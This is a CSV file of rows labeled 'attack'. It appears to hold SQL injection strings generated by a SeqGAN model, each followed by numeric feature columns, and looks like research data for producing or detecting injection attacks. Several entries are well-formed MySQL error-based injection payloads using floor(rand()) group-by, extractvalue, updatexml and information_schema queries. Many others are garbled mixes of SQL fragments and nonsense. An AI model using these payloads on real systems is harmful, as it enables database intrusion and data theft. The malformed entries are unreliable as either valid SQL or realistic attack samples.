attack,"-]. 1 information_schemaTxe_ 6055  0  113  (  adaatkr  (  (  ,  ||chr   0 from  (  *2 )i     )   AND x   xuT select A112  select 5192     (  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,86,142.0,39.0,4.116642920080936,55.0,18.0,52.0,17.0,0.3873239436619718,0.1267605633802817,0.36619718309859156,0.11971830985915492,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,0.0,2.0,1.0,4.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'||  (  select ''   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,87,339.0,40.0,3.8898688576882052,108.0,55.0,134.0,42.0,0.3185840707964602,0.16224188790560473,0.3952802359882006,0.12389380530973451,4.0,0.0,0.0,0.0,2.0,1.0,0.0,25.0,1.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1""y",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,88,3.0,3.0,1.584962500721156,1.0,1.0,0.0,1.0,0.3333333333333333,0.3333333333333333,0.0,0.3333333333333333,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   """"   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tr"" like ""coun_atryy	  select select.aMx x  WHERE WHEREART.IANLMISST R  (  =  )   fromu113  SELECTx  (   concat  ||chr   where      x  0 6tossxounad_r.||er.g.g_addr.(  (  ||chr  (  0  case 0 7469  ~   (  3440  || RWNUOou  (  ||r  (  0x7171706a71case m    8488 and    )  9173",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,89,702.0,57.0,4.122950001378657,241.0,101.0,274.0,86.0,0.3433048433048433,0.14387464387464388,0.3903133903133903,0.1225071225071225,0.0,6.0,0.0,0.0,1.0,3.0,0.0,46.0,0.0,3.0,9.0,14.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,2.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '_' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'0.eraLbddr.sala group SOWANDI.NUSNCTM 9173 else    )         ,0x717a767a71,floor  ||chr  (  4493  ||chr  (  ||chu  ||zuatolw  ||ato groupchasxu.as fromo E  et_i  =  ||cu6913r.as RINSTLNUNTNThroutysinie x  DISSUby  case 3051 group  LMI",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,90,774.0,56.0,4.447214972608269,333.0,103.0,248.0,90.0,0.43023255813953487,0.1330749354005168,0.32041343669250644,0.11627906976744186,4.0,0.0,0.0,0.0,4.0,4.0,0.0,40.0,0.0,6.0,12.0,21.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,1.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,"1 D""NST where FROM R. end6055  )     from from FROM  113  113  ||chr  (  )     SELECT when group from  (  ||chr  (  case when   (  (  select  1 end  9067  4232  ) from union 1     FROM   ||ch (  113  )  ||Uchr  (abdrojhr_adiaynx end  )      4386  ||4386  0x7171706a71122  )  )  and group and _ 1 E  ||chr  )  ch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,91,311.0,51.0,4.330961228405868,127.0,46.0,107.0,31.0,0.40836012861736337,0.14790996784565916,0.3440514469453376,0.09967845659163987,0.0,1.0,0.0,0.0,0.0,0.0,0.0,15.0,0.0,2.0,0.0,12.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,1.0,7.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1"" DESFROMchrhr  6237r  0  or 6913  ||  8190  4232  113  )     0    WHERE AT by 7469  select D end  )  ||chr  (  ||chr  4493   when  112  6270  (  =  )     --2   ,0x717a767a71,floor  (  b2 SELECT 1   1 from AIhr  (  =  )  ||chr  (  (  ,0x717a767a71,  0x5c  ||  (  =  select   thenselect else union0 else x  ~  )     or 3931 5584 4493l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,92,334.0,52.0,4.286834999358268,108.0,74.0,119.0,33.0,0.32335329341317365,0.2215568862275449,0.3562874251497006,0.09880239520958084,0.0,1.0,2.0,0.0,0.0,3.0,0.0,12.0,0.0,0.0,4.0,15.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%_106hrhr   from 4493  rand  --,concat  case  9173  )     ,  concat   (  =  5023  ||chr  (  1297,,  select  )     
   (    casea 1 or by endg r  (  ),  113  ||c  =  5023,else   thenILSOU group LTRysCetphtounjaads 7158  =  ||r   x   u  6055,0x717a767a71,floor  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,93,262.0,49.0,4.370181249843616,100.0,45.0,88.0,29.0,0.3816793893129771,0.1717557251908397,0.33587786259541985,0.11068702290076336,0.0,0.0,2.0,0.0,1.0,3.0,0.0,7.0,1.0,1.0,8.0,12.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'axu'  =  '_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,94,190.0,27.0,3.3943296851314395,42.0,35.0,85.0,28.0,0.22105263157894736,0.18421052631578946,0.4473684210526316,0.14736842105263157,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"150000001   or   then hr  (  selectmdd_r  rand  (  * case when   9325  select   )    ,andselect union1   ||chr  (  ||chr  (   when   froma   SELECTIM union FROM and  =  )       )    )     from (  ||chount_r  =  ||wuinn   a by FROM  rand  =  )     0WHERE union   select   )    5023  )   thenxNc,0x717a767a71vpoltyhr  (    *  )  SELECT W.xh",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,95,338.0,51.0,4.264061056143273,155.0,28.0,123.0,32.0,0.45857988165680474,0.08284023668639054,0.363905325443787,0.09467455621301775,0.0,0.0,0.0,0.0,2.0,3.0,0.0,14.0,0.0,2.0,2.0,13.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,2.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,-7562,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,96,5.0,5.0,2.321928094887362,0.0,4.0,0.0,1.0,0.0,0.8,0.0,0.2,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1j'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'kethsxuiau' like 'amt  6825a concat  ||  (  (  select S union dchrhrr  rand  rand  6237,concat  =  0x717a767a71,1  )     3440  case  'i'  4493  select 0 FROM DIATIhrhrT  (  0  =  cr  4232  ||chrhhr  (  (  ||chr  =  rand  (  select L D from  x  select a   U  (  )  ) from end  ||chr  (  113  ) concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,97,624.0,53.0,4.161428092392804,240.0,90.0,229.0,65.0,0.38461538461538464,0.14423076923076922,0.36698717948717946,0.10416666666666667,6.0,0.0,0.0,0.0,2.0,4.0,0.0,36.0,0.0,0.0,8.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,4.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,24.0
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""7864(  chhr  (  )  4386  =  t  tr  )    concat  )   )    , m 5023nt  (  113  0  )     then concat  *a113  )        x   thenin unionselect dun(  )   then union else FROM end  select 1 from 0mi    )    --,  113   or (  ,O1  (  )     l  ||chr  tr  (  ||r  (  ||chr  (  =  =  ||aucdroadlsls   (n2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,98,521.0,43.0,3.794231101697532,175.0,63.0,220.0,63.0,0.33589251439539347,0.12092130518234165,0.42226487523992323,0.12092130518234165,0.0,2.0,2.0,0.0,1.0,4.0,0.0,37.0,1.0,0.0,8.0,15.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%5996)   then extractvalue  (     )   a   x else 6055  )   x ISTR  (  (  *   =u  ),floor  l  *  cr.chr  (  t  122  )    1   ,concat,  (  ||chr  (  =  ,  113  )      (  ||  ||  =  (  chrqtotrT  (  4493  4232  =  case groupU end  9325  )   x from a end  --2   )    and 1  LS 7158   (  6237,0x717a767a71,0x717a767a71        )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,99,323.0,45.0,3.9280365991896304,91.0,56.0,135.0,41.0,0.28173374613003094,0.17337461300309598,0.4179566563467492,0.12693498452012383,0.0,0.0,2.0,0.0,2.0,4.0,0.0,19.0,1.0,0.0,6.0,14.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-""when   )     112  )   or 1 or m  ||chuntaualaelt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,100,50.0,19.0,3.5524876891689536,22.0,4.0,18.0,6.0,0.44,0.08,0.36,0.12,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%'  =  's'  =  'yf,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,101,19.0,8.0,2.458453829233059,3.0,1.0,8.0,7.0,0.15789473684210525,0.05263157894736842,0.42105263157894735,0.3684210526315789,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"else by else DxMIT1IITruntuademne 0s   WHERE from where xINNchrou  rand  =  )     SELECT 1 by 1 union (  *i,0x78   )  )       =   or or group 1 0 2 4493 Io  )     (  --   --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,102,173.0,48.0,4.274743099715604,83.0,14.0,62.0,14.0,0.4797687861271676,0.08092485549132948,0.3583815028901734,0.08092485549132948,0.0,0.0,4.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1""   f   || else   concat  (  ||cr  (  *2   )     x AxINl_sxesetas.a   2131  ,hr  (  *2ua   )     )     SELECT 1 byE  =  select   SELECT 1 whenhra x end  t_tt*.dr.gr.ss.:=xs.rr  (  e  8190  ||crou  4493  6237  )     )   then chr  a 5305  )  ||chr  =  122  rand  )    then 1 m ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,103,276.0,48.0,4.0678951785215505,102.0,29.0,109.0,36.0,0.3695652173913043,0.10507246376811594,0.39492753623188404,0.13043478260869565,0.0,1.0,0.0,0.0,3.0,3.0,0.0,11.0,0.0,2.0,1.0,14.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select 'yisx,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,104,21.0,13.0,3.45852501923415,10.0,1.0,5.0,5.0,0.47619047619047616,0.047619047619047616,0.23809523809523808,0.23809523809523808,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   """" IIbs  0  0x7171706a71)  0ar  (  *2   )     ,concat  ||II"" like ""chraleedozsdmetp.rand  ||xthrhr    (  )  106  case when (  case when   (  ,concat  0  >  rand  0  #  ,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,105,369.0,39.0,3.7744825725522477,118.0,51.0,152.0,48.0,0.31978319783197834,0.13821138211382114,0.41192411924119243,0.13008130081300814,0.0,5.0,0.0,0.0,2.0,1.0,0.0,25.0,0.0,0.0,7.0,8.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'a   6a by from 1then end  SELECT(  4232  )e  )  ||l_rastT  (  orj  (  4386  )   thenx  ||ru  6237  ||chr  0x7171706a71(  case then 1 select 1 x  )   (  )   and 0 1 1 when  (  =a   )     then union 1  5023  case when   L 1   FROM 1S   (  6237  cthen I hr  (  ||chr  (  ||ch  (  (  ,(  )       0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,106,295.0,47.0,3.948003271500907,102.0,42.0,118.0,33.0,0.34576271186440677,0.1423728813559322,0.4,0.11186440677966102,1.0,0.0,0.0,0.0,0.0,1.0,0.0,19.0,0.0,1.0,1.0,11.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1 else by 1 where end,1  122  ||cuanr  (  5    --2   )   (  )     )   then 1  0 1 select when   then (  113  0  5840,7562  )  )   4493),0x717a767a71,floorr  ) FROM end  ,floor  (  ||chrr  (  )  )    0x78 group FROM 0 )   )  ||chr  (  select  I from6082  *,  4232  )   or)i   ( thenfrom when end  a s when R group R   A",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,107,318.0,44.0,4.1304555359433195,118.0,48.0,117.0,35.0,0.3710691823899371,0.1509433962264151,0.36792452830188677,0.11006289308176101,0.0,0.0,2.0,0.0,1.0,0.0,0.0,20.0,0.0,0.0,6.0,9.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""'  =  '%%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""3",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,108,502.0,40.0,3.64598166239922,146.0,67.0,220.0,69.0,0.2908366533864542,0.13346613545816732,0.43824701195219123,0.13745019920318724,2.0,4.0,0.0,0.0,3.0,3.0,0.0,42.0,2.0,2.0,9.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,"1""   from   )    118   x   x  )     (in  ,0x717a767a71,0x717a767a71,floor  select or where FROMl  case from 2131 whenx  (  (  =tahr  (  =  ||choun.  =  =  )     )   thenchr  (  4232  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,109,184.0,36.0,3.9860471265249826,66.0,30.0,67.0,21.0,0.358695652173913,0.16304347826086957,0.3641304347826087,0.11413043478260869,0.0,1.0,0.0,0.0,0.0,4.0,0.0,10.0,0.0,0.0,3.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'||  (  select 'oqlwzk. RO'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '   WHERE DS' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||' end  0 |   SELECT by s 7158  (  0  =  )   from   R from       (  from  )   and havingST IEeesurur  (  case) and 9067 4493  9067SELECT 5023  )  )   (  having D x.t_r",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110,548.0,55.0,4.198952921406249,175.0,103.0,206.0,64.0,0.3193430656934307,0.18795620437956204,0.3759124087591241,0.11678832116788321,6.0,0.0,0.0,0.0,0.0,4.0,0.0,35.0,0.0,1.0,11.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,2.0,4.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1'   )     (  *2i,0x717a767a71,  )  )     )   6825 x 0  where 1 ""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""a else 3931 or 113  112  ,1   x  case   )    )   )   8877 m end  from 9067 froms(  having else  =  ||ahr  (  6237,  113  || hr  =  =  =  =  from from union (  0  select   m   SELECT AC oIT:U by    FROM xICTR.seinnt_r  (  >  chr  (  SELECT 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111,611.0,57.0,4.179452311143767,211.0,99.0,235.0,66.0,0.3453355155482815,0.16202945990180032,0.38461538461538464,0.10801963993453355,1.0,2.0,0.0,0.0,3.0,6.0,0.0,35.0,0.0,1.0,10.0,15.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,9.0,4.0,1.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ' 4493 else chchhr  (  case mselect   a u   where froma concat  )  6055  et  0x7171706a71   (  ,,concat  ||chr  tact_ad_res and 6913  e  )   a 7158 s    1 Eselect from and  1 and1 union >hr  )  || UM 0x717a767a71)   or x byIN' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'T,  0  =  0 4493  %concat  (  ||ICd.U C  1 from  select   )    )   =  ,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112,855.0,50.0,4.160611092627492,326.0,135.0,304.0,90.0,0.38128654970760234,0.15789473684210525,0.35555555555555557,0.10526315789473684,4.0,0.0,0.0,0.0,4.0,4.0,0.0,47.0,2.0,4.0,15.0,16.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,4.0,1.0,5.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,33.0
attack,"-584015967    thenE  SELECT DISNT  (  randr  *  =     )   (  having      SELECT x group FROM x  ) when     (  select end  )  0  ||'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's(     AND    FROM h  (  (  ||U  (  ,0x717a767a71,  a when W x  case  =    || or and or (  3440  )    )     :,floor  case 1 RO5inap orx FROM me   thenx  ||chhr  u  ,1    or  )  ||co",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113,489.0,55.0,4.00280780661036,165.0,60.0,207.0,57.0,0.3374233128834356,0.12269938650306748,0.4233128834355828,0.1165644171779141,2.0,0.0,1.0,0.0,1.0,3.0,0.0,30.0,0.0,0.0,9.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,3.0,3.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,1%yv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114,4.0,4.0,2.0,2.0,1.0,0.0,1.0,0.5,0.25,0.0,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
